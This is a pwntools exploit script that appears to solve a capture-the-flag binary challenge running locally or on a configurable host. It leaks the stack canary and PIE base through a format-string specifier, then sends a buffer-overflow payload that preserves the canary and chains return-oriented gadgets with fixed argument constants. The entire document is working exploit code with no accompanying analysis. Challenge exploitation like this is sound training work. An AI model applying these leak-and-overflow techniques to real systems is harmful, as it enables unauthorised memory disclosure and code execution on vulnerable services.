from pwn import *

context.binary = b = ELF('./challenge', checksec=False)

def get_io():
    if args.REMOTE:
        return remote(args.HOST or 'localhost', int(args.PORT or 9006))
    return process(b.path)

# Single connection for Leak + Exploit (Canary is process-specific)
io = get_io()

# Leak Canary (17) and PIE (19)
io.sendlineafter(b"required: ", b"%17$p.%19$p")
io.recvuntil(b"confirmed: ")
leaks = io.recvline().strip().decode().split('.')
canary = int(leaks[0], 16)
pie = int(leaks[1], 16)

b.address = pie - 0x162c
success(f"Canary recovered: {hex(canary)}")
success(f"PIE Base found:   {hex(b.address)}")

# Proceed to _auth_guard overflow in the same session
payload = flat([
    b"A"*40, canary, b"B"*8, 
    b.address + 0x1498, # ret
    b.address + 0x1482, # gadget 1 (_proc_ctx_1)
    0x1337, 1, 0x1206, 0x1161, 0xcafebab, 
    b.address + 0x40b0, # k_dispatch_table
    b.address + 0x149b  # gadget 2 (_proc_ctx_2)
])

io.sendafter(b": ", payload)
print(io.recvall(timeout=5).decode('utf-8', 'replace'))
io.close()
